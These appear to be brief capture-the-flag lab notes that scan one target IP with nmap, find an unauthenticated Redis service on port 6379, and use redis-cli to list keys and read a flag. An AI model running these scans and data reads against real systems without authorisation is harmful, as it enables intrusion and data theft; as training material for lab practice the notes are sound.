10.129.244.85

nmap -sV --open -oA initial_scan 10.129.244.85
nmap -p- --open -oA full_tcp_scan 10.129.244.85
nmap -sC -p 22,80 -oA script_scan  10.129.244.85

found port 6379 serving redis
install redis-tools

redis-cli -h 10.129.244.85
>info
>keys *
>get flag